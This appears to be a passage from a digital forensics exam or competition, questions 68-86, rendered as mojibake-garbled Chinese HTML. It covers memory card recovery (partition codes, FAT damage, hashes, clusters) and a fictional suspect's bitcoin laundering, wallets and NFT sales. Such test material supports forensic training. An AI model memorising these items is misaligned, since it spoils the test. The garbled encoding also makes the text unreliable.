1</h1><p>å•é€‰<br>A:1;<br>B:2;<br>C:3;<br>D:4;<br>E:0    </p><h1 id="68-æ£€è§†è®°å¿†å¡ä¸Šç¡¬ç›˜åˆ†åŒºè¡¨èµ„è®¯ï¼Œç¬¬äºŒä¸ªåˆ†åŒºçš„åˆ†åŒºä»£ç -Partition-Code-æ˜¯ä»€ä¹ˆ-1"><a href="#68-æ£€è§†è®°å¿†å¡ä¸Šç¡¬ç›˜åˆ†åŒºè¡¨èµ„è®¯ï¼Œç¬¬äºŒä¸ªåˆ†åŒºçš„åˆ†åŒºä»£ç -Partition-Code-æ˜¯ä»€ä¹ˆ-1" class="headerlink" title="68    æ£€è§†è®°å¿†å¡ä¸Šç¡¬ç›˜åˆ†åŒºè¡¨èµ„è®¯ï¼Œç¬¬äºŒä¸ªåˆ†åŒºçš„åˆ†åŒºä»£ç  (Partition Code) æ˜¯ä»€ä¹ˆ?    1"></a>68    æ£€è§†è®°å¿†å¡ä¸Šç¡¬ç›˜åˆ†åŒºè¡¨èµ„è®¯ï¼Œç¬¬äºŒä¸ªåˆ†åŒºçš„åˆ†åŒºä»£ç  (Partition Code) æ˜¯ä»€ä¹ˆ?    1</h1><p>å•é€‰<br>A:07;<br>B:AF;<br>C:0C;<br>D:2B;<br>E:01    </p><h1 id="69-è®°å¿†å¡çš„æ¡£æ¡ˆä¸èƒ½è¢«è¯»å–ï¼Œè®°å¿†å¡å—æŸçš„åŸå› åŒ…æ‹¬-2"><a href="#69-è®°å¿†å¡çš„æ¡£æ¡ˆä¸èƒ½è¢«è¯»å–ï¼Œè®°å¿†å¡å—æŸçš„åŸå› åŒ…æ‹¬-2" class="headerlink" title="69    è®°å¿†å¡çš„æ¡£æ¡ˆä¸èƒ½è¢«è¯»å–ï¼Œè®°å¿†å¡å—æŸçš„åŸå› åŒ…æ‹¬?    2"></a>69    è®°å¿†å¡çš„æ¡£æ¡ˆä¸èƒ½è¢«è¯»å–ï¼Œè®°å¿†å¡å—æŸçš„åŸå› åŒ…æ‹¬?    2</h1><p>å¤šé€‰    A:ç›®å½•é¡¹ç»“æ„ (Directory Entry) å—æŸ;<br>B:å¯åŠ¨æ‰‡åŒºè¡¨ (Master Boot Record) å—æŸ;<br>C:æ–‡ä»¶åˆ†é…è¡¨ (File Allocation Table - FAT) å—æŸ;<br>D:å¼•å¯¼æ‰‡åŒº (Boot Sector) å—æŸ;<br>E:ä»¥ä¸Šå„é¡¹çš†æ˜¯    </p><h1 id="70-æ‰¿ä¸Šé¢˜ï¼Œé€šè¿‡åˆ†æåŠæ‰‹åŠ¨æ¢å¤è¿˜åŸï¼Œè®°å¿†å¡é‡Œæœ‰å¤šå°‘ä¸ªå‡ºéŒ¯çš„æƒ…å†µå‡ºç°-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#70-æ‰¿ä¸Šé¢˜ï¼Œé€šè¿‡åˆ†æåŠæ‰‹åŠ¨æ¢å¤è¿˜åŸï¼Œè®°å¿†å¡é‡Œæœ‰å¤šå°‘ä¸ªå‡ºéŒ¯çš„æƒ…å†µå‡ºç°-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="70    æ‰¿ä¸Šé¢˜ï¼Œé€šè¿‡åˆ†æåŠæ‰‹åŠ¨æ¢å¤è¿˜åŸï¼Œè®°å¿†å¡é‡Œæœ‰å¤šå°‘ä¸ªå‡ºéŒ¯çš„æƒ…å†µå‡ºç°? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>70    æ‰¿ä¸Šé¢˜ï¼Œé€šè¿‡åˆ†æåŠæ‰‹åŠ¨æ¢å¤è¿˜åŸï¼Œè®°å¿†å¡é‡Œæœ‰å¤šå°‘ä¸ªå‡ºéŒ¯çš„æƒ…å†µå‡ºç°? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><h1 id="71-è®°å¿†å¡ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ-File-System-ä¸­æœ‰ä¸€ä¸ªå›¾ç‰‡æ¡£æ¡ˆï¼Œå®ƒçš„SHA-256å“ˆå¸Œå€¼æ˜¯-â€˜F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AFâ€™ã€‚è¯¥æ¡£æ¡ˆæ˜¾ç¤ºäº†å“ªäº›å½±åƒ-2"><a href="#71-è®°å¿†å¡ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ-File-System-ä¸­æœ‰ä¸€ä¸ªå›¾ç‰‡æ¡£æ¡ˆï¼Œå®ƒçš„SHA-256å“ˆå¸Œå€¼æ˜¯-â€˜F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AFâ€™ã€‚è¯¥æ¡£æ¡ˆæ˜¾ç¤ºäº†å“ªäº›å½±åƒ-2" class="headerlink" title="71    è®°å¿†å¡ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ (File System) ä¸­æœ‰ä¸€ä¸ªå›¾ç‰‡æ¡£æ¡ˆï¼Œå®ƒçš„SHA-256å“ˆå¸Œå€¼æ˜¯  â€˜F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AFâ€™ã€‚è¯¥æ¡£æ¡ˆæ˜¾ç¤ºäº†å“ªäº›å½±åƒ?    2"></a>71    è®°å¿†å¡ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ (File System) ä¸­æœ‰ä¸€ä¸ªå›¾ç‰‡æ¡£æ¡ˆï¼Œå®ƒçš„SHA-256å“ˆå¸Œå€¼æ˜¯  â€˜F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AFâ€™ã€‚è¯¥æ¡£æ¡ˆæ˜¾ç¤ºäº†å“ªäº›å½±åƒ?    2</h1><p>å¤šé€‰    A:äºº;<br>B:å±±;<br>C:æ±½è½¦;<br>D:äº¤é€šç¯;<br>E:å¤©ç©º    </p><h1 id="72-æ£€è§†è®°å¿†å¡çš„æ•°æ®ï¼Œåœ¨2022å¹´10æœˆ9æ—¥çº¦ä¸­åˆ12æ—¶5åˆ†è‡³12æ—¶15åˆ†ä¹‹é—´çš„å½•åƒ-Video-ä¸­ï¼Œæ›¾ç»å‡ºç°å“ªä¸€ä¸ªIPåœ°å€-2"><a href="#72-æ£€è§†è®°å¿†å¡çš„æ•°æ®ï¼Œåœ¨2022å¹´10æœˆ9æ—¥çº¦ä¸­åˆ12æ—¶5åˆ†è‡³12æ—¶15åˆ†ä¹‹é—´çš„å½•åƒ-Video-ä¸­ï¼Œæ›¾ç»å‡ºç°å“ªä¸€ä¸ªIPåœ°å€-2" class="headerlink" title="72    æ£€è§†è®°å¿†å¡çš„æ•°æ®ï¼Œåœ¨2022å¹´10æœˆ9æ—¥çº¦ä¸­åˆ12æ—¶5åˆ†è‡³12æ—¶15åˆ†ä¹‹é—´çš„å½•åƒ (Video) ä¸­ï¼Œæ›¾ç»å‡ºç°å“ªä¸€ä¸ªIPåœ°å€?    2"></a>72    æ£€è§†è®°å¿†å¡çš„æ•°æ®ï¼Œåœ¨2022å¹´10æœˆ9æ—¥çº¦ä¸­åˆ12æ—¶5åˆ†è‡³12æ—¶15åˆ†ä¹‹é—´çš„å½•åƒ (Video) ä¸­ï¼Œæ›¾ç»å‡ºç°å“ªä¸€ä¸ªIPåœ°å€?    2</h1><p>å•é€‰<br>A:61.238.217.108;<br>B:155.137.190.123;<br>C:192.168.1.66;<br>D:185.200.100.242;<br>E:213.104.156.111    </p><h1 id="73-æ¢å¤è¿˜åŸåçš„è®°å¿†å¡ä¸­ï¼Œç¬¬äºŒä¸ªæ–‡ä»¶ç³»ç»Ÿæ˜¾ç¤ºæœ‰å¤šå°‘ä¸ªç©ºé—²ç°‡-Free-Cluster-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º"><a href="#73-æ¢å¤è¿˜åŸåçš„è®°å¿†å¡ä¸­ï¼Œç¬¬äºŒä¸ªæ–‡ä»¶ç³»ç»Ÿæ˜¾ç¤ºæœ‰å¤šå°‘ä¸ªç©ºé—²ç°‡-Free-Cluster-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º" class="headerlink" title="73    æ¢å¤è¿˜åŸåçš„è®°å¿†å¡ä¸­ï¼Œç¬¬äºŒä¸ªæ–‡ä»¶ç³»ç»Ÿæ˜¾ç¤ºæœ‰å¤šå°‘ä¸ªç©ºé—²ç°‡ (Free Cluster)? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º"></a>73    æ¢å¤è¿˜åŸåçš„è®°å¿†å¡ä¸­ï¼Œç¬¬äºŒä¸ªæ–‡ä»¶ç³»ç»Ÿæ˜¾ç¤ºæœ‰å¤šå°‘ä¸ªç©ºé—²ç°‡ (Free Cluster)? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º</h1><h1 id="74-è®°å¿†å¡ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªè§†é¢‘æ¡£ï¼Œå®ƒçš„SHA-256å“ˆå¸Œå€¼æ˜¯-â€˜847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19â€™ï¼Œè¿™ä¸ªè§†é¢‘çš„æ¡£æ•°æ®å­˜åœ¨æ–‡ä»¶ç³»ç»Ÿ-File-System-çš„æœ€åçš„ç°‡å·-Last-Cluster-Number-æ˜¯ä»€ä¹ˆ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º"><a href="#74-è®°å¿†å¡ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªè§†é¢‘æ¡£ï¼Œå®ƒçš„SHA-256å“ˆå¸Œå€¼æ˜¯-â€˜847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19â€™ï¼Œè¿™ä¸ªè§†é¢‘çš„æ¡£æ•°æ®å­˜åœ¨æ–‡ä»¶ç³»ç»Ÿ-File-System-çš„æœ€åçš„ç°‡å·-Last-Cluster-Number-æ˜¯ä»€ä¹ˆ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º" class="headerlink" title="74    è®°å¿†å¡ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªè§†é¢‘æ¡£ï¼Œå®ƒçš„SHA-256å“ˆå¸Œå€¼æ˜¯ â€˜847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19â€™ï¼Œè¿™ä¸ªè§†é¢‘çš„æ¡£æ•°æ®å­˜åœ¨æ–‡ä»¶ç³»ç»Ÿ (File System) çš„æœ€åçš„ç°‡å· (Last Cluster Number) æ˜¯ä»€ä¹ˆ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º"></a>74    è®°å¿†å¡ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªè§†é¢‘æ¡£ï¼Œå®ƒçš„SHA-256å“ˆå¸Œå€¼æ˜¯ â€˜847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19â€™ï¼Œè¿™ä¸ªè§†é¢‘çš„æ¡£æ•°æ®å­˜åœ¨æ–‡ä»¶ç³»ç»Ÿ (File System) çš„æœ€åçš„ç°‡å· (Last Cluster Number) æ˜¯ä»€ä¹ˆ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º</h1><h1 id="75-å°è¯•åˆ†æè®°å¿†å¡æ•°æ®çµæ§‹å—æŸçš„åŸå› ï¼Œé€šè¿‡åˆé€‚çš„æ–¹æ³•æŠŠæ•°æ®æ¢å¤åˆ°åŸæœ¬æ²¡æœ‰å‡ºé”™çš„çŠ¶å†µï¼Œè®°å¿†å¡çš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆï¼Ÿ-3"><a href="#75-å°è¯•åˆ†æè®°å¿†å¡æ•°æ®çµæ§‹å—æŸçš„åŸå› ï¼Œé€šè¿‡åˆé€‚çš„æ–¹æ³•æŠŠæ•°æ®æ¢å¤åˆ°åŸæœ¬æ²¡æœ‰å‡ºé”™çš„çŠ¶å†µï¼Œè®°å¿†å¡çš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆï¼Ÿ-3" class="headerlink" title="75    å°è¯•åˆ†æè®°å¿†å¡æ•°æ®çµæ§‹å—æŸçš„åŸå› ï¼Œé€šè¿‡åˆé€‚çš„æ–¹æ³•æŠŠæ•°æ®æ¢å¤åˆ°åŸæœ¬æ²¡æœ‰å‡ºé”™çš„çŠ¶å†µï¼Œè®°å¿†å¡çš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆï¼Ÿ    3"></a>75    å°è¯•åˆ†æè®°å¿†å¡æ•°æ®çµæ§‹å—æŸçš„åŸå› ï¼Œé€šè¿‡åˆé€‚çš„æ–¹æ³•æŠŠæ•°æ®æ¢å¤åˆ°åŸæœ¬æ²¡æœ‰å‡ºé”™çš„çŠ¶å†µï¼Œè®°å¿†å¡çš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆï¼Ÿ    3</h1><p>å•é€‰<br>A:E63DF0â€¦ â€¦8627D3;<br>B:3FD99Eâ€¦ â€¦17B6DE;<br>C:3BADAAâ€¦ â€¦666A8F;<br>D:BBB211â€¦ â€¦E00710;<br>E:AA9E81â€¦ â€¦2C04FE    </p><h1 id="76-æœ—å°¼çš„è®¡ç®—æœºæœ‰ä»€ä¹ˆè½¯ä»¶å¯ä»¥åˆ›å»ºæ¯”ç‰¹å¸é’±åŒ…-Bitcoin-Wallet-1"><a href="#76-æœ—å°¼çš„è®¡ç®—æœºæœ‰ä»€ä¹ˆè½¯ä»¶å¯ä»¥åˆ›å»ºæ¯”ç‰¹å¸é’±åŒ…-Bitcoin-Wallet-1" class="headerlink" title="76    æœ—å°¼çš„è®¡ç®—æœºæœ‰ä»€ä¹ˆè½¯ä»¶å¯ä»¥åˆ›å»ºæ¯”ç‰¹å¸é’±åŒ… (Bitcoin Wallet)?    1"></a>76    æœ—å°¼çš„è®¡ç®—æœºæœ‰ä»€ä¹ˆè½¯ä»¶å¯ä»¥åˆ›å»ºæ¯”ç‰¹å¸é’±åŒ… (Bitcoin Wallet)?    1</h1><p>å•é€‰<br>A:MetaMask;<br>B:Electrum;<br>C:Trezor;<br>D:ä»¥ä¸Šçš†é    </p><h1 id="77-æœ—å°¼é€šè¿‡æ¯”ç‰¹å¸æ›¿ç‹æ™¯æµ©æ¸…æ´—é»‘é’±ï¼Œåˆ†ææœ—å°¼çš„è®¡ç®—æœºåŠæ‰‹æœºï¼Œæœ—å°¼æ”¶å–ç‹æ™¯æµ©é»‘é’±çš„æ¯”ç‰¹å¸åœ°å€-Bitcoin-Address-æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#77-æœ—å°¼é€šè¿‡æ¯”ç‰¹å¸æ›¿ç‹æ™¯æµ©æ¸…æ´—é»‘é’±ï¼Œåˆ†ææœ—å°¼çš„è®¡ç®—æœºåŠæ‰‹æœºï¼Œæœ—å°¼æ”¶å–ç‹æ™¯æµ©é»‘é’±çš„æ¯”ç‰¹å¸åœ°å€-Bitcoin-Address-æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="77    æœ—å°¼é€šè¿‡æ¯”ç‰¹å¸æ›¿ç‹æ™¯æµ©æ¸…æ´—é»‘é’±ï¼Œåˆ†ææœ—å°¼çš„è®¡ç®—æœºåŠæ‰‹æœºï¼Œæœ—å°¼æ”¶å–ç‹æ™¯æµ©é»‘é’±çš„æ¯”ç‰¹å¸åœ°å€ (Bitcoin Address) æ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>77    æœ—å°¼é€šè¿‡æ¯”ç‰¹å¸æ›¿ç‹æ™¯æµ©æ¸…æ´—é»‘é’±ï¼Œåˆ†ææœ—å°¼çš„è®¡ç®—æœºåŠæ‰‹æœºï¼Œæœ—å°¼æ”¶å–ç‹æ™¯æµ©é»‘é’±çš„æ¯”ç‰¹å¸åœ°å€ (Bitcoin Address) æ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><h1 id="78-æœ—å°¼æ”¶å–ç‹æ™¯æµ©å¤šå°‘æ¯”ç‰¹å¸ä½œä¸ºæ¸…æ´—é»‘é’±çš„è´¹ç”¨-1"><a href="#78-æœ—å°¼æ”¶å–ç‹æ™¯æµ©å¤šå°‘æ¯”ç‰¹å¸ä½œä¸ºæ¸…æ´—é»‘é’±çš„è´¹ç”¨-1" class="headerlink" title="78    æœ—å°¼æ”¶å–ç‹æ™¯æµ©å¤šå°‘æ¯”ç‰¹å¸ä½œä¸ºæ¸…æ´—é»‘é’±çš„è´¹ç”¨?    1"></a>78    æœ—å°¼æ”¶å–ç‹æ™¯æµ©å¤šå°‘æ¯”ç‰¹å¸ä½œä¸ºæ¸…æ´—é»‘é’±çš„è´¹ç”¨?    1</h1><p>å•é€‰<br>A:1%;<br>B:4%;<br>C:7%;<br>D:10%;<br>E:15%    </p><h1 id="79-æœ—å°¼çš„è®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªæ²¡è¢«åŠ å¯†çš„æ¯”ç‰¹å¸é’±åŒ…ï¼Œå®ƒçš„å›å¤ç§å­-Recovery-Seed-ä¸åŒ…å«å“ªä¸€ä¸ªè‹±æ–‡å­—-1"><a href="#79-æœ—å°¼çš„è®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªæ²¡è¢«åŠ å¯†çš„æ¯”ç‰¹å¸é’±åŒ…ï¼Œå®ƒçš„å›å¤ç§å­-Recovery-Seed-ä¸åŒ…å«å“ªä¸€ä¸ªè‹±æ–‡å­—-1" class="headerlink" title="79    æœ—å°¼çš„è®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªæ²¡è¢«åŠ å¯†çš„æ¯”ç‰¹å¸é’±åŒ…ï¼Œå®ƒçš„å›å¤ç§å­ (Recovery Seed) ä¸åŒ…å«å“ªä¸€ä¸ªè‹±æ–‡å­—?    1"></a>79    æœ—å°¼çš„è®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªæ²¡è¢«åŠ å¯†çš„æ¯”ç‰¹å¸é’±åŒ…ï¼Œå®ƒçš„å›å¤ç§å­ (Recovery Seed) ä¸åŒ…å«å“ªä¸€ä¸ªè‹±æ–‡å­—?    1</h1><p>å•é€‰<br>A:oppose;<br>B:area;<br>C:twice;<br>D:roast    </p><h1 id="80-æœ—å°¼çš„è®¡ç®—æœºé‡Œæœ‰å¤šå°‘ä¸ªåŠ å¯†äº†-Encrypted-çš„æ¯”ç‰¹å¸é’±åŒ…-1"><a href="#80-æœ—å°¼çš„è®¡ç®—æœºé‡Œæœ‰å¤šå°‘ä¸ªåŠ å¯†äº†-Encrypted-çš„æ¯”ç‰¹å¸é’±åŒ…-1" class="headerlink" title="80    æœ—å°¼çš„è®¡ç®—æœºé‡Œæœ‰å¤šå°‘ä¸ªåŠ å¯†äº† (Encrypted) çš„æ¯”ç‰¹å¸é’±åŒ…?    1"></a>80    æœ—å°¼çš„è®¡ç®—æœºé‡Œæœ‰å¤šå°‘ä¸ªåŠ å¯†äº† (Encrypted) çš„æ¯”ç‰¹å¸é’±åŒ…?    1</h1><p>å•é€‰<br>A:1;<br>B:2;<br>C:3;<br>D:4;<br>E:5    </p><h1 id="81-æœ—å°¼å°†åŠ å¯†äº†çš„æ¯”ç‰¹å¸é’±åŒ…çš„å¯†ç å­˜åœ¨ä»–è®¡ç®—æœºçš„ä¸€ä¸ªæ¡£æ¡ˆé‡Œï¼Œè¿™ä¸ªæ¡£æ¡ˆçš„å‰¯æ¡£åæ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3"><a href="#81-æœ—å°¼å°†åŠ å¯†äº†çš„æ¯”ç‰¹å¸é’±åŒ…çš„å¯†ç å­˜åœ¨ä»–è®¡ç®—æœºçš„ä¸€ä¸ªæ¡£æ¡ˆé‡Œï¼Œè¿™ä¸ªæ¡£æ¡ˆçš„å‰¯æ¡£åæ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3" class="headerlink" title="81    æœ—å°¼å°†åŠ å¯†äº†çš„æ¯”ç‰¹å¸é’±åŒ…çš„å¯†ç å­˜åœ¨ä»–è®¡ç®—æœºçš„ä¸€ä¸ªæ¡£æ¡ˆé‡Œï¼Œè¿™ä¸ªæ¡£æ¡ˆçš„å‰¯æ¡£åæ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3"></a>81    æœ—å°¼å°†åŠ å¯†äº†çš„æ¯”ç‰¹å¸é’±åŒ…çš„å¯†ç å­˜åœ¨ä»–è®¡ç®—æœºçš„ä¸€ä¸ªæ¡£æ¡ˆé‡Œï¼Œè¿™ä¸ªæ¡£æ¡ˆçš„å‰¯æ¡£åæ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3</h1><p>å•é€‰<br>A:DMG;<br>B:PDF;<br>C:ASD;<br>D:ZIP;<br>E:PNG    </p><h1 id="82-æœ—å°¼åœ¨æ‰‹æœºé‡Œæœ‰ä¸€ä¸ªåŠ å¯†äº†çš„æ¯”ç‰¹å¸é’±åŒ…ï¼Œä»–é‡‡ç”¨ä»€ä¹ˆåº”ç”¨ç¨‹åºæŠŠè¯¥é’±åŒ…é‡Œçš„é»‘é’±è½¬æ¢æˆå¦ä¸€ç§åŠ å¯†è´§å¸-2"><a href="#82-æœ—å°¼åœ¨æ‰‹æœºé‡Œæœ‰ä¸€ä¸ªåŠ å¯†äº†çš„æ¯”ç‰¹å¸é’±åŒ…ï¼Œä»–é‡‡ç”¨ä»€ä¹ˆåº”ç”¨ç¨‹åºæŠŠè¯¥é’±åŒ…é‡Œçš„é»‘é’±è½¬æ¢æˆå¦ä¸€ç§åŠ å¯†è´§å¸-2" class="headerlink" title="82    æœ—å°¼åœ¨æ‰‹æœºé‡Œæœ‰ä¸€ä¸ªåŠ å¯†äº†çš„æ¯”ç‰¹å¸é’±åŒ…ï¼Œä»–é‡‡ç”¨ä»€ä¹ˆåº”ç”¨ç¨‹åºæŠŠè¯¥é’±åŒ…é‡Œçš„é»‘é’±è½¬æ¢æˆå¦ä¸€ç§åŠ å¯†è´§å¸?    2"></a>82    æœ—å°¼åœ¨æ‰‹æœºé‡Œæœ‰ä¸€ä¸ªåŠ å¯†äº†çš„æ¯”ç‰¹å¸é’±åŒ…ï¼Œä»–é‡‡ç”¨ä»€ä¹ˆåº”ç”¨ç¨‹åºæŠŠè¯¥é’±åŒ…é‡Œçš„é»‘é’±è½¬æ¢æˆå¦ä¸€ç§åŠ å¯†è´§å¸?    2</h1><p>å•é€‰<br>A:Safepal;<br>B:Metamask;<br>C:Changelly;<br>D:Opensea    </p><h1 id="83-æ‰¿ä¸Šé¢˜ï¼Œè¿™æ¬¡è½¬æ¢åŠ å¯†è´§å¸çš„æ—¥æœŸå’Œæ—¶é—´æ˜¯ä»€ä¹ˆ-ä»¥æ—¶åŒºUTC-8å›ç­”-2"><a href="#83-æ‰¿ä¸Šé¢˜ï¼Œè¿™æ¬¡è½¬æ¢åŠ å¯†è´§å¸çš„æ—¥æœŸå’Œæ—¶é—´æ˜¯ä»€ä¹ˆ-ä»¥æ—¶åŒºUTC-8å›ç­”-2" class="headerlink" title="83    æ‰¿ä¸Šé¢˜ï¼Œè¿™æ¬¡è½¬æ¢åŠ å¯†è´§å¸çš„æ—¥æœŸå’Œæ—¶é—´æ˜¯ä»€ä¹ˆ? (ä»¥æ—¶åŒºUTC+8å›ç­”)    2"></a>83    æ‰¿ä¸Šé¢˜ï¼Œè¿™æ¬¡è½¬æ¢åŠ å¯†è´§å¸çš„æ—¥æœŸå’Œæ—¶é—´æ˜¯ä»€ä¹ˆ? (ä»¥æ—¶åŒºUTC+8å›ç­”)    2</h1><p>å•é€‰<br>A:2022-10-07 10:29æ—¶;<br>B:2022-10-07 11:06æ—¶;<br>C:2022-10-07 11:07æ—¶;<br>D:2022-10-07 13:54æ—¶    </p><h1 id="84-æœ—å°¼åœ¨è®¡ç®—æœºé‡Œé‡‡ç”¨ä»€ä¹ˆæµè§ˆå™¨-Browser-åŠåœ¨ä»€ä¹ˆæ—¥æœŸæ—¶é—´åœ¨ä»–çš„è®¡ç®—æœºå®‰è£…-â€˜MetaMaskâ€™-ä»¥æ—¶åŒºUTC-8å›ç­”-1"><a href="#84-æœ—å°¼åœ¨è®¡ç®—æœºé‡Œé‡‡ç”¨ä»€ä¹ˆæµè§ˆå™¨-Browser-åŠåœ¨ä»€ä¹ˆæ—¥æœŸæ—¶é—´åœ¨ä»–çš„è®¡ç®—æœºå®‰è£…-â€˜MetaMaskâ€™-ä»¥æ—¶åŒºUTC-8å›ç­”-1" class="headerlink" title="84    æœ—å°¼åœ¨è®¡ç®—æœºé‡Œé‡‡ç”¨ä»€ä¹ˆæµè§ˆå™¨ (Browser) åŠåœ¨ä»€ä¹ˆæ—¥æœŸæ—¶é—´åœ¨ä»–çš„è®¡ç®—æœºå®‰è£… â€˜MetaMaskâ€™ ? (ä»¥æ—¶åŒºUTC+8å›ç­”)    1"></a>84    æœ—å°¼åœ¨è®¡ç®—æœºé‡Œé‡‡ç”¨ä»€ä¹ˆæµè§ˆå™¨ (Browser) åŠåœ¨ä»€ä¹ˆæ—¥æœŸæ—¶é—´åœ¨ä»–çš„è®¡ç®—æœºå®‰è£… â€˜MetaMaskâ€™ ? (ä»¥æ—¶åŒºUTC+8å›ç­”)    1</h1><p>å•é€‰<br>A:Chrome 2022-08-25 12:35æ—¶;<br>B:Chrome 2022-10-07 14:29æ—¶;<br>C:Firefox 2022-08-25 12:35æ—¶;<br>D:Firefox 2022-10-07 14:29æ—¶    </p><h1 id="85-æœ—å°¼åœ¨è®¡ç®—æœºé‡Œæ‰€åˆ›å»ºçš„éåŒè´¨åŒ–é€šè¯-Non-Fungible-Token-NFT-ä½¿ç”¨å“ªä¸€ä¸ªç§åŒºå—é“¾-Blockchain-æŠ€æœ¯-1"><a href="#85-æœ—å°¼åœ¨è®¡ç®—æœºé‡Œæ‰€åˆ›å»ºçš„éåŒè´¨åŒ–é€šè¯-Non-Fungible-Token-NFT-ä½¿ç”¨å“ªä¸€ä¸ªç§åŒºå—é“¾-Blockchain-æŠ€æœ¯-1" class="headerlink" title="85    æœ—å°¼åœ¨è®¡ç®—æœºé‡Œæ‰€åˆ›å»ºçš„éåŒè´¨åŒ–é€šè¯ (Non-Fungible Token - NFT) ä½¿ç”¨å“ªä¸€ä¸ªç§åŒºå—é“¾ (Blockchain) æŠ€æœ¯?    1"></a>85    æœ—å°¼åœ¨è®¡ç®—æœºé‡Œæ‰€åˆ›å»ºçš„éåŒè´¨åŒ–é€šè¯ (Non-Fungible Token - NFT) ä½¿ç”¨å“ªä¸€ä¸ªç§åŒºå—é“¾ (Blockchain) æŠ€æœ¯?    1</h1><p>å•é€‰<br>A:Ethereum;<br>B:Polygon;<br>C:Solana;<br>D:Arbitrum;<br>E:Klaytn    </p><h1 id="86-æœ—å°¼åœ¨ä»€ä¹ˆæ—¥æœŸæ—¶é—´æŠŠè®¡ç®—æœºä¸­åˆ›å»ºçš„éåŒè´¨åŒ–é€šè¯-NFT-æ”¾å”®-ä»¥æ—¶åŒºUTC-8å›ç­”-2"><a href="#86-æœ—å°¼åœ¨ä»€ä¹ˆæ—¥æœŸæ—¶é—´æŠŠè®¡ç®—æœºä¸­åˆ›å»ºçš„éåŒè´¨åŒ–é€šè¯-NFT-æ”¾å”®-ä»¥æ—¶åŒºUTC-8å›ç­”-2" class="headerlink" title="86    æœ—å°¼åœ¨ä»€ä¹ˆæ—¥æœŸæ—¶é—´æŠŠè®¡ç®—æœºä¸­åˆ›å»ºçš„éåŒè´¨åŒ–é€šè¯ (NFT) æ”¾å”®? (ä»¥æ—¶åŒºUTC+8å›ç­”)    2"></a>86    æœ—å°¼åœ¨ä»€ä¹ˆæ—¥æœŸæ—¶é—´æŠŠè®¡ç®—æœºä¸­åˆ›å»ºçš„éåŒè´¨åŒ–é€šè¯ (NFT) æ”¾å”®? (ä»¥æ—¶åŒºUTC+8å›ç­”)    2</h1><p>å•é€‰<br>A:2022-10-07 14:47æ—¶;<br>B:2022-10-07 14:49æ—¶;<br>C:2022-10-07 14:52æ—¶;<br>D:2022-10-07 14:54æ—¶    </p><h1 